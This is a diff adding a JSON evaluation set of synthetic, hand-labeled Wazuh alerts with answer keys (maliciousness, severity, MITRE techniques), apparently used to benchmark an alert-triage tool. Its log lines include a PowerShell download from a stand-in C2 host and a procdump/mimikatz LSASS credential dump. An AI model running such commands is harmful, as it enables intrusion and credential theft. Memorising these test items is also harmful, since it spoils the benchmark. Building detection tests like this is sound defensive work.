@@ -1,0 +1,83 @@
+{
+  "_description": "Hand-labeled synthetic evaluation set for the benchmark in scripts/benchmark.py. Each case has a ground-truth label (is_malicious, expected severity band, expected MITRE technique IDs) assigned by hand when the case was authored -- these are the 'known expected outputs' the brief asks for. All hosts/IPs/users are synthetic.",
+  "cases": [
+    {
+      "case_id": "malicious-powershell-c2",
+      "label": "True Positive: encoded PowerShell downloading from C2 after a successful brute-force logon",
+      "ground_truth": {
+        "is_malicious": true,
+        "expected_severity_band": ["high", "critical"],
+        "expected_mitre_techniques": ["T1059.001", "T1110", "T1078"]
+      },
+      "alert_bundle": {
+        "source": "wazuh-synthetic",
+        "alerts": [
+          {"rule": {"id": "1", "level": 10, "description": "Multiple failed logon attempts"}, "agent": {"name": "EVAL-HOST-1", "ip": "10.30.0.1"}, "data": {"event_type": "authentication_failure"}, "full_log": "Account Name: eval.user Source Network Address: 45.33.12.9 (failed logon)", "timestamp": "2026-09-06T10:00:00+00:00"},
+          {"rule": {"id": "2", "level": 5, "description": "Successful logon"}, "agent": {"name": "EVAL-HOST-1", "ip": "10.30.0.1"}, "data": {"event_type": "authentication_success"}, "full_log": "Account Name: eval.user Source Network Address: 45.33.12.9 (successful logon)", "timestamp": "2026-09-06T10:00:40+00:00"},
+          {"rule": {"id": "3", "level": 15, "description": "Suspicious encoded PowerShell execution"}, "agent": {"name": "EVAL-HOST-1", "ip": "10.30.0.1"}, "data": {"event_type": "process_creation"}, "full_log": "powershell.exe -enc SQBFAFgA DownloadString('http://malware-c2-eval.badguy.net/p.ps1')", "timestamp": "2026-09-06T10:01:10+00:00"}
+        ]
+      }
+    },
+    {
+      "case_id": "malicious-credential-dumping",
+      "label": "True Positive: LSASS memory access consistent with credential dumping",
+      "ground_truth": {
+        "is_malicious": true,
+        "expected_severity_band": ["high", "critical"],
+        "expected_mitre_techniques": ["T1003.001"]
+      },
+      "alert_bundle": {
+        "source": "wazuh-synthetic",
+        "alerts": [
+          {"rule": {"id": "4", "level": 15, "description": "Suspicious LSASS memory access via procdump"}, "agent": {"name": "EVAL-HOST-2", "ip": "10.30.0.2"}, "data": {"event_type": "process_creation"}, "full_log": "procdump.exe -ma lsass.exe lsass_dump.dmp -- mimikatz sekurlsa::logonpasswords", "timestamp": "2026-09-06T11:00:00+00:00"}
+        ]
+      }
+    },
+    {
+      "case_id": "benign-admin-powershell",
+      "label": "True Negative: routine, unencoded admin PowerShell script with no attack indicators",
+      "ground_truth": {
+        "is_malicious": false,
+        "expected_severity_band": ["low", "unknown"],
+        "expected_mitre_techniques": []
+      },
+      "alert_bundle": {
+        "source": "wazuh-synthetic",
+        "alerts": [
+          {"rule": {"id": "5", "level": 3, "description": "Scheduled maintenance script executed"}, "agent": {"name": "EVAL-HOST-3", "ip": "10.30.0.3"}, "data": {"event_type": "process_creation"}, "full_log": "powershell.exe -File C:\\Scripts\\disk-cleanup.ps1 -Verbose", "timestamp": "2026-09-06T12:00:00+00:00"}
+        ]
+      }
+    },
+    {
+      "case_id": "benign-single-failed-logon",
+      "label": "True Negative: a single failed logon (user mistyped password), no follow-up",
+      "ground_truth": {
+        "is_malicious": false,
+        "expected_severity_band": ["low", "unknown"],
+        "expected_mitre_techniques": []
+      },
+      "alert_bundle": {
+        "source": "wazuh-synthetic",
+        "alerts": [
+          {"rule": {"id": "6", "level": 4, "description": "Single failed logon attempt"}, "agent": {"name": "EVAL-HOST-4", "ip": "10.30.0.4"}, "data": {"event_type": "authentication_failure"}, "full_log": "Account Name: eval.user2 Source Network Address: 10.30.0.4 (failed logon, typo)", "timestamp": "2026-09-06T13:00:00+00:00"}
+        ]
+      }
+    },
+    {
+      "case_id": "malicious-brute-force-only",
+      "label": "True Positive: sustained brute force without confirmed follow-on activity",
+      "ground_truth": {
+        "is_malicious": true,
+        "expected_severity_band": ["medium", "high"],
+        "expected_mitre_techniques": ["T1110"]
+      },
+      "alert_bundle": {
+        "source": "wazuh-synthetic",
+        "alerts": [
+          {"rule": {"id": "7", "level": 10, "description": "Multiple failed logon attempts detected"}, "agent": {"name": "EVAL-HOST-5", "ip": "10.30.0.5"}, "data": {"event_type": "authentication_failure"}, "full_log": "Account Name: eval.admin Source Network Address: 91.203.5.20 (failed logon)", "timestamp": "2026-09-06T14:00:00+00:00"},
+          {"rule": {"id": "8", "level": 10, "description": "Multiple failed logon attempts detected"}, "agent": {"name": "EVAL-HOST-5", "ip": "10.30.0.5"}, "data": {"event_type": "authentication_failure"}, "full_log": "Account Name: eval.admin Source Network Address: 91.203.5.20 (failed logon)", "timestamp": "2026-09-06T14:00:20+00:00"}
+        ]
+      }
+    }
+  ]
+}
